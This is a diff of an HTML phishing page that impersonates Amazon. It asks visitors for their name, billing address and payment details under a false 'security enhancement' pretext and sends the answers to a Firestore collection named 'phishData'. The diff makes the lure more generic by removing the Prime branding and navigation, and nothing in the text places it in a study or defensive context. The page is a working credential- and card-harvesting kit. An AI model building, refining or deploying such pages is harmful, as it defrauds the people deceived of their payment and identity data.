@@ -9,18 +9,11 @@
     <script src="https://www.google.com/recaptcha/api.js" async defer></script>
     <style>
         body { font-family: 'Ember', Arial, sans-serif; background-color: #f3f3f3; margin: 0; padding: 20px; min-height: 100vh; }
-        .header { background-color: #232f3e; color: white; padding: 10px 20px; display: flex; align-items: center; justify-content: space-between; }
+        .header { background-color: #232f3e; color: white; padding: 10px 20px; text-align: center; }
         .header img { height: 30px; }
-        .header .nav { font-size: 14px; }
-        .header a { color: white; text-decoration: none; margin: 0 10px; }
-        .container { max-width: 900px; margin: 20px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .container { max-width: 700px; margin: 20px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
         .alert { background-color: #fff8e1; border-left: 4px solid #ff9900; padding: 15px; margin-bottom: 20px; color: #333; }
         .alert h3 { margin: 0 0 10px 0; color: #c45500; font-size: 18px; }
-        .prime-section { display: flex; align-items: center; margin-bottom: 20px; }
-        .prime-logo { margin-right: 15px; }
-        .prime-logo img { width: 80px; }
-        .prime-text { font-size: 16px; color: #333; }
-        .prime-text .prime-badge { background: #00a8e1; color: white; padding: 2px 6px; border-radius: 3px; font-size: 12px; margin-left: 5px; }
         .title { font-size: 28px; font-weight: 500; color: #333; margin-bottom: 10px; }
         .subtitle { font-size: 16px; color: #666; margin-bottom: 30px; }
         .secure-update { background: #f0f8ff; padding: 15px; border-radius: 6px; margin-bottom: 20px; display: flex; align-items: center; }
@@ -46,34 +39,20 @@
         .loading i { font-size: 24px; }
         .footer { margin-top: 40px; text-align: center; font-size: 12px; color: #666; border-top: 1px solid #ddd; padding-top: 20px; }
         .footer a { color: #007185; text-decoration: none; margin: 0 5px; }
-        @media (max-width: 768px) { .container { padding: 20px; } .row { flex-direction: column; } .header { flex-direction: column; align-items: flex-start; gap: 10px; } .prime-section { flex-direction: column; text-align: center; } }
+        @media (max-width: 768px) { .container { padding: 20px; } .row { flex-direction: column; } }
     </style>
 </head>
 <body>
     <div class="header">
         <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
-        <div class="nav">
-            <a href="#">Hello, Sign in</a>
-            <a href="#">Returns & Orders</a>
-            <a href="#">Cart</a>
-        </div>
     </div>
     <div class="container">
         <div class="alert">
             <h3>Payment Method Update Required</h3>
-            <p>Your Amazon Prime subscription payment method needs to be updated to continue enjoying benefits like free two-day shipping, Prime Video, and exclusive deals. This update is due to recent account security enhancements.</p>
-        </div>
-        <div class="prime-section">
-            <div class="prime-logo">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/f/f1/Prime_Video.png" alt="Amazon Prime">
-            </div>
-            <div class="prime-text">
-                <strong>Amazon Prime Membership</strong><span class="prime-badge">PRIME</span><br>
-                Free 2-Day Shipping | Prime Video | Exclusive Deals
-            </div>
+            <p>Your payment method on file needs to be updated for continued service. This is due to recent account security enhancements. Please update your information below.</p>
         </div>
         <div class="title">Update Payment Method</div>
-        <div class="subtitle">Securely update your payment information to keep your Amazon Prime benefits active.</div>
+        <div class="subtitle">Securely update your payment information.</div>
         <div class="secure-update">
             <i class="fas fa-shield-alt"></i>
             <p><strong>Secure Update:</strong> Your information is encrypted and protected. We never store your CVV.</p>
@@ -211,7 +190,7 @@
 
             try {
                 await addDoc(collection(db, "phishData"), {
-                    type: "amazon_prime_update",
+                    type: "amazon_payment_update",
                     fullName: fullName,
                     billingAddress: billingAddress,
                     billingCity: billingCity,
